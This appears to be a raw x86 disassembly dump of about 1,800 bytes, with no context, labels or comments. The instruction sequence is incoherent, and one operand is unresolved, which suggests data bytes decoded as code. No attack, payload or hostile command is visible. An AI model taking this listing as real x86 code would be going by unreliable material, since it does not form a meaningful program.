  402708:	adc    BYTE PTR [eax],ah
  40270a:	push   esp
  40270b:	or     DWORD PTR [eax+0x29040000],edx
  402711:	add    bl,BYTE PTR ds:0xc0591c31
  402717:	rol    BYTE PTR [eax],0x86
  40271a:	dec    eax
  40271b:	inc    ecx
  40271c:	adc    BYTE PTR [ecx],al
  40271e:	xor    eax,0x1ab40806
  402723:	and    BYTE PTR [edi],0x66
  402726:	xor    al,0x0
  402728:	or     BYTE PTR [eax],ah
  40272a:	add    BYTE PTR [edx+eax*1],ch
  40272d:	push   esp
  40272e:	inc    esp
  40272f:	sbb    BYTE PTR [esp+ecx*4+0xa],dl
  402733:	add    BYTE PTR [edx],al
  402735:	adc    al,0x38
  402737:	xor    BYTE PTR [eax],al
  402739:	sbb    al,0x16
  40273b:	and    BYTE PTR [edx],dl
  40273d:	cdq    
  40273e:	adc    al,0x18
  402740:	and    BYTE PTR [eax+0x41],0x10
  402744:	aad    0x5c
  402746:	add    BYTE PTR [ebx+0x10],ch
  402749:	sbb    BYTE PTR [eax+0x4],al
  40274c:	add    BYTE PTR cs:[eax],al
  40274f:	inc    edx
  402750:	adc    BYTE PTR [eax],dl
  402752:	sub    al,0x4
  402754:	or     DWORD PTR [eax+0x21],ebp
  402757:	adc    cl,BYTE PTR [ebx+0x504f0900]
  40275d:	or     ah,BYTE PTR [eax]
  40275f:	mov    BYTE PTR [ecx+0x32],al
  402762:	nop
  402763:	add    al,BYTE PTR [ecx]
  402765:	fwait
  402766:	shl    BYTE PTR [ebx],0xc8
  402769:	fidiv  WORD PTR [eax]
  40276b:	adc    BYTE PTR [ecx+0x8],dh
  40276e:	sbb    eax,DWORD PTR [esp+eax*1+0x61]
  402772:	pop    eax
  402773:	push   esp
  402774:	add    BYTE PTR [eax],al
  402776:	and    esp,DWORD PTR [eax+0x20173960]
  40277c:	call   DWORD PTR ds:0x4380e4
  402782:	loope  0x402786
  402784:	adc    DWORD PTR [eax],0x16864813
  40278a:	rol    BYTE PTR [eax+eax*2],0x2
  40278e:	or     BYTE PTR [ebp-0x77fbeafe],bl
  402794:	cwde   
  402795:	add    DWORD PTR [eax+0x20238],ebx
  40279b:	xchg   DWORD PTR [esi],esp
  40279d:	xor    BYTE PTR [edx],cl
  40279f:	or     BYTE PTR [ecx+0x18],0x12
  4027a3:	mov    al,ds:0x35026480
  4027a8:	or     eax,0x4c20284d
  4027ad:	mov    BYTE PTR [eax*8+0x420304],bl
  4027b4:	cmp    cl,BYTE PTR [eax]
  4027b6:	add    cl,BYTE PTR [eax]
  4027b8:	loop   0x4027de
  4027ba:	or     eax,0xa02c14
  4027bf:	or     BYTE PTR [eax],cl
  4027c1:	test   BYTE PTR [eax+0x20280484],al
  4027c7:	add    bh,BYTE PTR [eax]
  4027c9:	xchg   ebp,eax
  4027ca:	add    BYTE PTR [edx],cl
  4027cc:	inc    eax
  4027cd:	add    BYTE PTR [eax],dl
  4027cf:	and    DWORD PTR [eax+0x37200001],ebx
  4027d5:	cmp    BYTE PTR [eax],al
  4027d7:	adc    BYTE PTR [ecx],al
  4027d9:	and    BYTE PTR [eax],al
  4027db:	adc    dl,BYTE PTR [eax]
  4027dd:	sub    al,BYTE PTR [eax-0x3ffd1d40]
  4027e3:	or     DWORD PTR [ecx],eax
  4027e5:	add    al,0xb0
  4027e7:	or     BYTE PTR [edx],0x10
  4027ea:	adc    BYTE PTR [eax+0x4051800],ah
  4027f0:	sbb    al,0x12
  4027f2:	add    cl,BYTE PTR [edx-0x7f]
  4027f5:	add    eax,0xce0a211
  4027fa:	adc    BYTE PTR [eax+edx*4+0x59202211],al
  402801:	add    BYTE PTR [esi+0x2c214211],cl
  402807:	add    BYTE PTR [ebx+0x2434124],dl
  40280d:	add    DWORD PTR [edx],edx
  40280f:	add    BYTE PTR [eax],al
  402811:	loopne 0x402835
  402813:	add    ch,BYTE PTR [eax+0x0]
  402816:	add    ecx,DWORD PTR [ecx+0x53]
  402819:	xchg   esp,eax
  40281a:	pusha  
  40281b:	add    BYTE PTR [esi-0x7ff6bf7a],bl
  402821:	add    BYTE PTR [eax+0x2],al
  402824:	or     eax,0x99634000
  402829:	sub    ecx,DWORD PTR [eax]
  40282b:	or     BYTE PTR [ecx-0x4b],cl
  40282e:	test   al,0xd8
  402830:	inc    eax
  402831:	js     0x402854
  402833:	sbb    DWORD PTR [eax],eax
  402835:	sub    BYTE PTR [esp+ebx*4],0x64
  402839:	inc    esp
  40283a:	xor    al,0x24
  40283c:	or     BYTE PTR [edx+0x1a],al
  40283f:	add    BYTE PTR [eax],al
  402841:	inc    eax
  402842:	mov    BYTE PTR [edx+eax*1],al
  402845:	cmp    al,0xd2
  402847:	and    BYTE PTR [eax+0x0],ah
  40284a:	and    al,0x0
  40284c:	inc    esp
  40284d:	xchg   ecx,eax
  40284e:	dec    esp
  40284f:	sub    al,0x0
  402851:	add    BYTE PTR [eax+edx*4],0x89
  402855:	xor    DWORD PTR [edx],edx
  402857:	adc    BYTE PTR [eax],0x0
  40285a:	add    BYTE PTR [eax+eax*4],0x2
  40285e:	add    al,0x80
  402860:	add    BYTE PTR [edx],ch
  402862:	mov    ah,BYTE PTR [ecx]
  402864:	add    BYTE PTR [eax+0x28],0x1
  402868:	and    BYTE PTR [ecx],al
  40286a:	or     DWORD PTR [eax+eax*2+0x1],ebp
  40286e:	push   es
  40286f:	sub    BYTE PTR [ecx+0x1b0020],al
  402875:	add    DWORD PTR [eax+esi*1],ecx
  402878:	sbb    BYTE PTR [eax+0x42048022],ah
  40287e:	ror    BYTE PTR [eax],1
  402880:	adc    eax,0x19060294
  402885:	push   eax
  402886:	das    
  402887:	adc    BYTE PTR [edx-0x7f],cl
  40288a:	inc    eax
  40288b:	dec    ecx
  40288c:	enter  0x82,0x94
  402890:	adc    al,0x90
  402892:	and    BYTE PTR cs:[edi+0x9],0xa1
  402897:	adc    DWORD PTR [eax],eax
  402899:	add    BYTE PTR [ecx],bl
  40289b:	or     BYTE PTR [eax+0x40],ah
  40289e:	add    BYTE PTR [ebx-0x7c],0x14
  4028a2:	mov    eax,ds:0x9104a0a6
  4028a7:	push   ds
  4028a8:	add    BYTE PTR [eax],cl
  4028aa:	add    cl,BYTE PTR [eax]
  4028ac:	jno    0x402890
  4028ae:	sbb    BYTE PTR [edi],0x1
  4028b1:	test   DWORD PTR ds:0xc2030084,ecx
  4028b7:	or     dl,BYTE PTR [edx]
  4028b9:	add    bl,BYTE PTR [eax-0x77]
  4028bc:	and    BYTE PTR [ecx],ah
  4028be:	add    dh,BYTE PTR [eax+0x2090f980]
  4028c4:	mov    BYTE PTR [eax+eiz*1],ah
  4028c7:	add    al,0x56
  4028c9:	adc    BYTE PTR [ecx+0x18],al
  4028cc:	ror    ah,1
  4028ce:	and    BYTE PTR [eax],ah
  4028d0:	add    al,0x20
  4028d2:	adc    al,0xaa
  4028d4:	adc    BYTE PTR [edx],cl
  4028d6:	mov    dl,0x30
  4028d8:	add    DWORD PTR [eax],eax
  4028da:	adc    BYTE PTR ds:0x10104112,cl
  4028e0:	xor    eax,0x251d00c4
  4028e5:	ret    0xb
  4028e8:	add    BYTE PTR [eax],0x0
  4028eb:	mov    al,BYTE PTR ds:0x30501216
  4028f1:	add    DWORD PTR [eax],eax
  4028f3:	and    BYTE PTR [ecx+0x6],cl
  4028f6:	xor    al,0x10
  4028f8:	mov    eax,0x1208028a
  4028fd:	inc    eax
  4028fe:	add    al,0x71
  402900:	adc    al,0x93
  402902:	add    bl,dl
  402904:	push   es
  402905:	jo     0x402964
  402907:	and    eax,0x44805310
  40290c:	or     DWORD PTR [eax],eax
  40290e:	mov    ds:0x58401221,al
  402913:	rol    BYTE PTR [eax+eax*1-0x7e],0x22
  402918:	add    BYTE PTR [edx+0x50],al
  40291b:	adc    BYTE PTR [eax],dl
  40291d:	xchg   ecx,eax
  40291e:	adc    al,0x1
  402920:	loope  0x402945
  402922:	pop    eax
  402923:	inc    esp
  402924:	and    dl,BYTE PTR [ebx+edx*4]
  402927:	or     BYTE PTR [eax],al
  402929:	push   ebp
  40292a:	adc    BYTE PTR [ecx+0x38da8021],dh
  402930:	add    BYTE PTR [eax],al
  402932:	or     eax,0x10006a4
  402937:	adc    BYTE PTR [ebx-0x5b3ff700],ah
  40293d:	adc    eax,0x2810bc66
  402942:	inc    eax
  402943:	adc    DWORD PTR [eax],eax
  402945:	add    al,BYTE PTR [ebx+eiz*1]
  402948:	inc    esp
  402949:	sub    DWORD PTR [ecx],ecx
  40294b:	add    al,0x35
  40294d:	push   ss
  40294e:	add    BYTE PTR [edx+0x4],al
  402951:	and    DWORD PTR [edx+eax*1+0x8],eax
  402955:	rol    DWORD PTR [ecx+0x12b8c831],0xa2
  40295c:	lds    edx,FWORD PTR fs:[eax]
  40295f:	inc    esp
  402960:	add    BYTE PTR [eax+0x2c],al
  402963:	test   al,0x4d
  402965:	mov    ds:0xbb8820c4,al
  40296a:	adc    DWORD PTR [edi],eax
  40296c:	and    BYTE PTR [eax+eax*2],al
  40296f:	dec    ecx
  402970:	pop    esp
  402971:	xor    BYTE PTR [ecx+edx*4+0x19],al
  402975:	enter  0xc020,0xc0
  402979:	add    BYTE PTR [edx],al
  40297b:	add    edx,DWORD PTR [ecx+eax*1+0x30a21106]
  402982:	adc    eax,0x10010ac0
  402987:	push   edi
  402988:	adc    BYTE PTR [edx],0x33
  40298b:	add    BYTE PTR [eax+0x8114006],0xc
  402992:	adc    BYTE PTR [ecx+0x4],cl
  402995:	and    DWORD PTR [eax],ecx
  402997:	adc    eax,DWORD PTR [ecx]
  402999:	and    DWORD PTR [eax],edx
  40299b:	data16 add al,BYTE PTR [ebx+0x2]
  40299f:	add    BYTE PTR ds:0x60187182,dh
  4029a5:	pusha  
  4029a6:	push   esp
  4029a7:	or     BYTE PTR [eax+eax*4+0x54],0x23
  4029ac:	ror    DWORD PTR [eax+0x8],0xc1
  4029b0:	add    DWORD PTR [eax+0x14],ebp
  4029b3:	out    0x48,al
  4029b5:	adc    BYTE PTR [ecx],0x89
  4029b8:	or     BYTE PTR [ebx+ecx*1],ah
  4029bb:	test   eax,0x1854c897
  4029c0:	xchg   esp,eax
  4029c1:	les    eax,FWORD PTR [eax]
  4029c3:	add    BYTE PTR [ecx+0x5080a084],ah
  4029c9:	push   ebp
  4029ca:	add    BYTE PTR ds:0x90649090,0x80
  4029d1:	aam    0x48
  4029d3:	adc    DWORD PTR [esi],ecx
  4029d5:	mov    al,ds:0x4a400284
  4029da:	les    esp,FWORD PTR [ebx+0x25200220]
  4029e0:	adc    BYTE PTR [edi+eiz*2],cl
  4029e3:	inc    eax
  4029e4:	add    BYTE PTR [eax],al
  4029e6:	add    BYTE PTR [ecx+eax*1],0x41
  4029ea:	inc    eax
  4029eb:	jne    0x4029f1
  4029ed:	sub    BYTE PTR [edx+0x40831495],cl
  4029f3:	test   BYTE PTR [esi+0x461d1840],ah
  4029f9:	or     BYTE PTR [ecx+0x6],dl
  4029fc:	jo     0x402a52
  4029fe:	rol    BYTE PTR [esp+0x508a1140],0x8
  402a06:	push   eax
  402a07:	or     DWORD PTR [ebx],esp
  402a09:	add    BYTE PTR [eax],cl
  402a0b:	inc    ecx
  402a0c:	and    al,0x1b
  402a0e:	test   BYTE PTR [ecx],ah
  402a10:	and    al,0x47
  402a12:	mov    al,ah
  402a14:	add    BYTE PTR [eax+ebp*1],ch
  402a17:	inc    esp
  402a18:	add    dh,BYTE PTR [eax]
  402a1a:	add    ebx,ecx
  402a1c:	adc    DWORD PTR [eax+0x30002a85],ecx
  402a22:	pop    eax
  402a23:	inc    esp
  402a24:	xor    DWORD PTR [eax],0x122b0908
  402a2a:	test   BYTE PTR ds:0xb4040088,ah
  402a30:	adc    DWORD PTR [edx],0xc1d3584
  402a36:	add    al,dl
  402a38:	enter  0xe001,0xd2
  402a3c:	pushf  
  402a3d:	inc    esp
  402a3e:	cwde   
  402a3f:	add    DWORD PTR [edx],0x0
  402a42:	push   es
  402a43:	inc    esp
  402a44:	or     al,0x26
  402a46:	fs xchg esp,eax
  402a48:	adc    BYTE PTR [eax+0x16448811],ch
  402a4e:	and    BYTE PTR [edx],0x2
  402a51:	or     BYTE PTR [eax+eiz*2+0x14820000],ah
  402a58:	rol    BYTE PTR [eax],0x42
  402a5b:	inc    esp
  402a5c:	xor    cl,BYTE PTR [eax]
  402a5e:	xchg   ebx,eax
  402a5f:	and    BYTE PTR [ebx],0x19
  402a62:	add    ch,BYTE PTR [ecx]
  402a64:	test   BYTE PTR [ebp+0x28],bh
  402a67:	cwde   
  402a68:	add    eax,0x42ca400
  402a6d:	or     BYTE PTR [eax-0x199bf5d8],al
  402a73:	xor    esi,DWORD PTR [eax]
  402a75:	add    al,0x1
  402a77:	add    ch,BYTE PTR [eax+eax*4]
  402a7a:	adc    dl,dl
  402a7c:	mov    eax,0x1000e800
  402a81:	push   es
  402a82:	xchg   ebp,eax
  402a83:	or     BYTE PTR [eax],al
  402a85:	dec    esi
  402a86:	inc    edx
  402a87:	or     eax,0x84811096
  402a8c:	jo     0x402a0f
  402a8e:	loopne 0x402a90
  402a90:	add    BYTE PTR [eax],al
  402a92:	adc    al,0x50
  402a94:	imul   ecx,DWORD PTR [eax],0x90001605
  402a9a:	add    BYTE PTR [eax],ch
  402a9c:	or     BYTE PTR [esp+edx*1],dl
  402a9f:	je     0x402a51
  402aa1:	add    BYTE PTR [eax-0x7ba377f0],0xc4
  402aa8:	test   al,0x2
  402aaa:	add    DWORD PTR [edx],ecx
  402aac:	add    eax,0x50b4244
  402ab1:	add    DWORD PTR [ecx],eax
  402ab3:	xor    DWORD PTR [esi-0x80],esp
  402ab6:	or     ebx,DWORD PTR [ecx+ecx*2]
  402ab9:	inc    eax
  402aba:	xor    DWORD PTR [esp+eax*4],eax
  402abd:	and    BYTE PTR [edx+0x31124200],al
  402ac3:	or     BYTE PTR [eax],al
  402ac5:	add    BYTE PTR [ebp+0x6d212440],0x0
  402acc:	add    al,0x13
  402ace:	jo     0x402ad0
  402ad0:	add    BYTE PTR [eax],bl
  402ad2:	add    BYTE PTR [edx],dl
  402ad4:	inc    eax
  402ad5:	xor    BYTE PTR [ebx],al
  402ad7:	and    esp,DWORD PTR [eax]
  402ad9:	pop    eax
  402ada:	add    DWORD PTR [edi],eax
  402adc:	inc    ebx
  402add:	jno    0x402aea
  402adf:	xor    BYTE PTR [eax+ecx*1+0x3013a020],ah
  402ae6:	mov    BYTE PTR ds:0x40222003,bh
  402aec:	andps  xmm0,XMMWORD PTR [ecx]
  402aef:	add    BYTE PTR [ecx-0x5ef47386],ch
  402af5:	sbb    DWORD PTR [ebx],eax
  402af7:	aad    0x60
  402af9:	xor    dh,bl
  402afb:	dec    esi
  402afc:	and    BYTE PTR [eax],ah
  402afe:	adc    dh,al
  402b00:	inc    ecx
  402b01:	lea    eax,[eax]
  402b03:	and    BYTE PTR [esi],al
  402b05:	sbb    BYTE PTR [eax],al
  402b07:	pusha  
  402b08:	add    BYTE PTR [eax-0x6bba5f3d],al
  402b0e:	adc    BYTE PTR [eax],al
  402b10:	push   ebx
  402b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b12:	add    BYTE PTR [eax],al
  402b14:	or     al,cl
  402b16:	and    BYTE PTR [eax],al
  402b18:	add    dl,BYTE PTR ds:0x71804290
  402b1e:	int3   
  402b1f:	add    BYTE PTR [eax-0x7dede537],al
  402b25:	adc    DWORD PTR [edx],0x46
  402b28:	inc    edx
  402b29:	or     DWORD PTR [esi],ebx
  402b2b:	adc    DWORD PTR [eax+ebx*1-0x7ecbb6ef],ebx
  402b32:	add    BYTE PTR [ecx+edx*4],ah
  402b35:	add    al,0x4c
  402b37:	adc    BYTE PTR [ecx],dh
  402b39:	and    eax,edx
  402b3b:	sub    al,0x30
  402b3d:	add    al,BYTE PTR [edx]
  402b3f:	and    al,0x8
  402b41:	pop    edx
  402b42:	and    bl,BYTE PTR [eax]
  402b44:	inc    ecx
  402b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b46:	adc    bl,BYTE PTR [edx]
  402b48:	or     BYTE PTR [eax+0x46],al
  402b4b:	mov    eax,ds:0x2814110
  402b50:	add    eax,0x151204
  402b55:	or     al,0x5
  402b57:	jo     0x402ada
  402b59:	push   ss
  402b5a:	stos   BYTE PTR es:[edi],al
  402b5b:	jl     0x402bad
  402b5d:	arpl   bp,ax
  402b5f:	sbb    BYTE PTR [eax+0x602c9156],al
  402b65:	add    DWORD PTR [edx],ecx
  402b67:	and    BYTE PTR [eax],0x6
  402b6a:	or     DWORD PTR [eax],eax
  402b6c:	add    al,0x4
  402b6e:	add    BYTE PTR [ebp+eax*4-0x3b9ffdf6],cl
  402b75:	inc    eax
  402b76:	and    BYTE PTR [eax],ch
  402b78:	adc    DWORD PTR [esp+eax*4],eax
  402b7b:	push   edx
  402b7c:	or     al,0x0
  402b7e:	add    dl,BYTE PTR ds:0x45048404
  402b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b85:	and    BYTE PTR [eax+0x6694e78c],dl
  402b8b:	mov    eax,eax
  402b8d:	xor    ch,al
  402b8f:	dec    edx
  402b90:	add    DWORD PTR [eax+eax*2],0x10018030
  402b97:	adc    DWORD PTR [ebx+0x44],eax
  402b9a:	or     BYTE PTR [edx],dh
  402b9c:	or     esp,DWORD PTR [ecx]
  402b9e:	add    DWORD PTR [eax-0x5d9facd8],esp
  402ba4:	and    BYTE PTR [edi],al
  402ba6:	add    BYTE PTR [esi+eax*1],dl
  402ba9:	xchg   BYTE PTR [ecx],al
  402bab:	mov    eax,0x1210038
  402bb0:	adc    DWORD PTR [edx],esp
  402bb2:	lock push 0x26
  402bb5:	add    al,BYTE PTR [eax]
  402bb7:	xchg   DWORD PTR [ecx],eax
  402bb9:	or     BYTE PTR [eax+0x882002],al
  402bbf:	adc    al,0x10
  402bc1:	push   esi
  402bc2:	add    ecx,DWORD PTR [eax]
  402bc4:	add    BYTE PTR [edx+0x10a8045],cl
  402bca:	add    DWORD PTR [ebx+0x2],0x19d440c
  402bd1:	cwde   
  402bd2:	add    BYTE PTR [eax],dl
  402bd4:	and    dl,BYTE PTR [eax+ecx*1]
  402bd7:	cmp    BYTE PTR [eax],al
  402bd9:	add    dl,0x9b
  402bdc:	xchg   esp,eax
  402bdd:	inc    edx
  402bde:	xor    DWORD PTR [eax],eax
  402be0:	add    cl,BYTE PTR [ecx]
  402be2:	add    BYTE PTR [ecx+eax*1-0x63],dl
  402be6:	add    al,0xc0
  402be8:	adc    DWORD PTR [ebx+eax*4+0x5c],eax
  402bec:	add    BYTE PTR [edx],al
  402bee:	mov    dh,0x21
  402bf0:	xor    al,BYTE PTR [ecx-0x77b5d000]
  402bf6:	or     al,0x1b
  402bf8:	sbb    al,0x41
  402bfa:	add    BYTE PTR [edi],al
  402bfc:	add    eax,0xa0a69100
  402c01:	cmp    DWORD PTR [esi+edx*1+0x5],0x4
  402c06:	inc    eax
  402c07:	cmp    DWORD PTR [eax+0x42024a10],eax
  402c0d:	add    BYTE PTR [eax],ch
  402c0f:	adc    dl,BYTE PTR [esi-0x157d57b0]
  402c15:	dec    eax
  402c16:	and    DWORD PTR [eax],0x3480018c
  402c1c:	add    DWORD PTR [eax],ebx
  402c1e:	xchg   BYTE PTR [eax+0x64],al
  402c21:	and    esi,DWORD PTR [edx+0x44]
  402c24:	fcom   DWORD PTR [eax-0x1e9ffffe]
  402c2a:	or     cl,BYTE PTR [eax+0x28780611]
  402c30:	loopne 0x402bbc
  402c32:	push   ss
  402c33:	add    DWORD PTR [ebx-0x36],edi
  402c36:	add    ebp,eax
  402c38:	sub    dh,BYTE PTR [eax]
  402c3a:	or     BYTE PTR [ecx],ah
  402c3c:	test   DWORD PTR [eax],edx
  402c3e:	and    BYTE PTR [ecx+0x20484884],dl
  402c44:	or     DWORD PTR [eax],esi
  402c46:	push   ecx
  402c47:	inc    ebp
  402c48:	xor    DWORD PTR ds:0x2031c0a4,eax
  402c4e:	sbb    eax,0x20da2403
  402c53:	mov    ebp,0x880ab091
  402c58:	add    ax,0x51b0
  402c5c:	and    edx,eax
  402c5e:	adc    BYTE PTR [eax],dl
  402c60:	add    bh,BYTE PTR [ecx+0x1d]
  402c63:	add    al,0x48
  402c65:	cmp    al,0x25
  402c67:	sub    BYTE PTR [esi],cl
  402c69:	test   BYTE PTR [edx],ah
  402c6b:	or     DWORD PTR [ecx],eax
  402c6d:	add    BYTE PTR [eax+eiz*1-0x7fcfb97d],al
  402c74:	inc    eax
  402c75:	add    al,0x4
  402c77:	mov    BYTE PTR [eax],al
  402c79:	push   esp
  402c7a:	add    BYTE PTR [eax+0x202543a2],0x88
  402c81:	adc    al,ah
  402c83:	adc    DWORD PTR [ebp-0x7c86ff56],ebp
  402c89:	push   edx
  402c8a:	jp     0x402c9c
  402c8c:	or     DWORD PTR [ebx+0x58],eax
  402c8f:	imul   ebp,DWORD PTR [esi+0x4a35b],0x5b4200d4
  402c99:	add    BYTE PTR [eax],al
  402c9b:	and    BYTE PTR [ecx],dl
  402c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c9e:	or     DWORD PTR [eax+0x44],eax
  402ca1:	sub    DWORD PTR [ecx+0x4],eax
  402ca4:	inc    esi
  402ca5:	mov    ds:0x5210004,al
  402caa:	pop    eax
  402cab:	push   eax
  402cac:	add    eax,0x20042481
  402cb1:	adc    BYTE PTR [eax],al
  402cb3:	and    BYTE PTR [esp+edx*1],ch
  402cb6:	rol    BYTE PTR [eax],0x20
  402cb9:	add    dl,BYTE PTR [ecx]
  402cbb:	push   es
  402cbc:	push   es
  402cbd:	adc    eax,0x21028400
  402cc2:	adc    BYTE PTR [esi],al
  402cc4:	shl    BYTE PTR [eax],0x80
  402cc7:	les    eax,FWORD PTR [ebx+0x5]
  402cca:	push   0x28
  402ccc:	or     DWORD PTR [edx],0x22010
  402cd2:	add    DWORD PTR [eax],eax
  402cd4:	adc    DWORD PTR [eax],esp
  402cd6:	mov    dl,0x2
  402cd8:	add    BYTE PTR [edx+eiz*1],al
  402cdb:	inc    esp
  402cdc:	add    DWORD PTR [eax],eax
  402cde:	inc    eax
  402cdf:	dec    eax
  402ce0:	lds    esp,FWORD PTR [eax-0x79dff7fa]
  402ce6:	mov    WORD PTR [esi],?
  402ce8:	sbb    ecx,DWORD PTR [eax]
  402cea:	or     al,0x8b
  402cec:	mov    al,ds:0x108180
  402cf1:	inc    eax
  402cf2:	mov    BYTE PTR [ebx],cl
  402cf4:	add    BYTE PTR [ecx+0x0],cl
  402cf7:	inc    eax
  402cf8:	fimul  DWORD PTR [ecx]
  402cfa:	add    BYTE PTR [eax],ah
  402cfc:	adc    BYTE PTR [eax+eiz*4],ah
  402cff:	sbb    eax,0x82a410c4
  402d04:	push   edx
  402d05:	add    al,0x34
  402d07:	add    BYTE PTR [edx+0x4ac1922],dl
  402d0d:	and    BYTE PTR ds:0x34008502,cl
  402d13:	sahf   
  402d14:	sbb    BYTE PTR [eax],al
  402d16:	add    DWORD PTR [ebp+0x4c032ba],0x425a1400
  402d20:	adc    DWORD PTR [eax],eax
  402d22:	add    al,BYTE PTR [eax-0x5d]
  402d25:	ror    BYTE PTR [eax],0xc
  402d28:	dec    edx
  402d29:	add    BYTE PTR [eax+eax*2],ah
  402d2c:	add    BYTE PTR [eax],al
  402d2e:	sub    BYTE PTR [eax],0xa4
  402d31:	mov    eax,ds:0x6480ac8
  402d36:	and    al,0x44
  402d38:	add    ah,BYTE PTR [eax+eiz*1+0x50002]
  402d3f:	add    BYTE PTR [eax+0x19],0xa2
  402d43:	add    DWORD PTR [ecx+0x40804010],eax
  402d49:	mov    ds:0x11218539,al
  402d4e:	sldt   WORD PTR [ecx+0x20]
  402d52:	and    DWORD PTR [eax],eax
  402d54:	mov    DWORD PTR [edi-0x7dffb7d4],ecx
  402d5a:	or     al,0xa
  402d5c:	sbb    BYTE PTR [ecx+esi*1+0x45185a],al
  402d63:	add    al,0x13
  402d65:	add    BYTE PTR [eax],al
  402d67:	mov    al,ds:0x98110a0
  402d6c:	add    BYTE PTR [eax+0x16],0x10
  402d70:	or     BYTE PTR [eax],dh
  402d72:	cwde   
  402d73:	sbb    DWORD PTR [ecx+0x25001840],esp
  402d79:	test   eax,0x18e11026
  402d7e:	add    cl,BYTE PTR [eax-0x3fbade00]
  402d84:	and    al,0x10
  402d86:	dec    esi
  402d87:	inc    edi
  402d88:	inc    edx
  402d89:	adc    BYTE PTR [eax],al
  402d8b:	add    DWORD PTR [eax],ecx
  402d8d:	rol    eax,0x10
  402d90:	adc    al,BYTE PTR [ecx-0x5c]
  402d93:	add    BYTE PTR [edx],al
  402d95:	inc    ecx
  402d96:	add    BYTE PTR [eax+0x29c634d4],al
  402d9c:	xor    BYTE PTR [eax+0x818e42],ah
  402da2:	or     BYTE PTR [ebx],bl
  402da4:	dec    eax
  402da5:	add    BYTE PTR [esi],dh
  402da7:	add    eax,0x20002310
  402dac:	adc    eax,0x2100bc2
  402db1:	add    al,0x28
  402db3:	es adc eax,0x805013
  402db9:	xor    bl,cl
  402dbb:	or     BYTE PTR [eax],al
  402dbd:	sbb    cl,ah
  402dbf:	add    eax,0x2e7000
  402dc4:	lods   al,BYTE PTR ds:[esi]
  402dc5:	adc    BYTE PTR [eax-0x80],dh
  402dc8:	inc    eax
  402dc9:	sbb    BYTE PTR [eax],al
  402dcb:	inc    esp
  402dcc:	imul   esp,DWORD PTR [eax],0x2010d4b2
  402dd2:	adc    eax,0x4a4480
  402dd7:	sbb    eax,0x850301f0
  402ddc:	or     al,0x40
  402dde:	cdq    
  402ddf:	add    BYTE PTR [eax+eax*1-0x78],al
  402de3:	pusha  
  402de4:	add    DWORD PTR [edx+0x18],eax
  402de7:	nop
  402de8:	push   ebx
  402de9:	dec    ebp
  402dea:	sub    al,BYTE PTR [eax+0x21]
  402ded:	and    BYTE PTR [eax],dh
  402def:	adc    BYTE PTR [eax+0x220c4480],0x95
  402df6:	add    BYTE PTR [eax+0x43],al
  402df9:	push   ds
  402dfa:	inc    ecx
  402dfb:	or     BYTE PTR [edi],cl
  402dfd:	inc    esp
  402dfe:	add    eax,0xb0807c1c
  402e03:	loopne 0x402e08
  402e05:	sbb    BYTE PTR [eax-0x7e7bef87],cl
  402e0b:	les    eax,FWORD PTR [ebx]
  402e0d:	add    al,BYTE PTR [eax+edx*8+0x1]
  402e11:	and    al,0xd3
  402e13:	sub    BYTE PTR [eax],cl
  402e15:	or     al,0x6
  402e17:	nop
  402e18:	adc    BYTE PTR [eax],al
  402e1a:	add    dh,BYTE PTR [ecx]
  402e1c:	xchg   al,bl
  402e1e:	or     DWORD PTR ss:[esp+esi*1],eax
  402e22:	xor    BYTE PTR [eax],cl
  402e24:	inc    esi
  402e25:	sbb    BYTE PTR [ebx],al
  402e27:	mov    ebx,DWORD PTR [eax+esi*1]
  402e2a:	add    BYTE PTR [eax],0x1
  402e2d:	push   es
  402e2e:	mov    BYTE PTR [ecx],al
  402e30:	add    BYTE PTR [eax+esi*4],bl
  402e33:	pop    ss
  402e34:	popa   
  402e35:	inc    edi
  402e36:	nop
  402e37:	mov    BYTE PTR [eax],al
  402e39:	clc    
  402e3a:	or     BYTE PTR [eax+0x60282e12],al
  402e40:	or     al,0xc0
  402e42:	sub    dl,BYTE PTR [eax+0x0]
  402e45:	mov    ds:0xa200c0,al
  402e4a:	add    al,BYTE PTR [eax]
  402e4c:	in     al,dx
  402e4d:	sub    DWORD PTR [eax],eax
  402e4f:	mov    ebp,0x4010734
  402e54:	and    BYTE PTR [ecx+ecx*1],al
  402e57:	mov    esp,0x1d0490b0
  402e5c:	add    eax,0x8d012154
  402e61:	bound  eax,QWORD PTR ds:0x17812454
  402e67:	add    BYTE PTR [eax],0x54
  402e6a:	popa   
  402e6b:	add    DWORD PTR [eax],eax
  402e6d:	adc    al,ah
  402e6f:	push   ebx
  402e70:	or     BYTE PTR [edx],cl
  402e72:	add    al,0x0
  402e74:	inc    eax
  402e75:	add    dl,BYTE PTR [eax-0x1477d7e8]
  402e7b:	and    al,0x88
  402e7d:	inc    esp
  402e7e:	push   ss
  402e7f:	ret    0x60
  402e82:	or     BYTE PTR [eax],dh
  402e84:	add    BYTE PTR [eax],cl
  402e86:	rol    BYTE PTR [ecx],0xa
  402e89:	inc    eax
  402e8a:	add    BYTE PTR [ecx],cl
  402e8c:	add    al,al
  402e8e:	fs and al,0x50
  402e91:	shr    BYTE PTR [esp+edx*1],0x8
  402e95:	add    BYTE PTR [eax],ch
  402e97:	add    BYTE PTR [edx],0x86
  402e9a:	jbe    0x402e9e
  402e9c:	or     BYTE PTR [ecx],cl
  402e9e:	rol    DWORD PTR [eax-0x7df77ef4],0x8
  402ea5:	add    BYTE PTR [esi],al
  402ea7:	dec    eax
  402ea8:	push   eax
  402ea9:	add    DWORD PTR [ecx+ebx*2],edx
  402eac:	inc    ebx
  402ead:	mov    cl,0x83
  402eaf:	sbb    BYTE PTR [ecx],ah
  402eb1:	add    ah,BYTE PTR [ecx]
  402eb3:	adc    al,0x13
  402eb5:	adc    eax,0x400ac020
  402eba:	or     al,BYTE PTR [edx]
  402ebc:	enter  0x1224,0xda
  402ec0:	or     al,BYTE PTR [eax+0x9080c0]
  402ec6:	loopne 0x402e48
  402ec8:	or     BYTE PTR [ecx+0x82acaa1],cl
  402ece:	add    ch,BYTE PTR [eax+eax*2-0x80]
  402ed2:	add    eax,0x101028c2
  402ed7:	push   eax
  402ed8:	mov    dl,0x80
  402eda:	jmp    0x9012:0x54150805
  402ee1:	nop
  402ee2:	add    BYTE PTR [ecx],ah
  402ee4:	xor    BYTE PTR [edx],ah
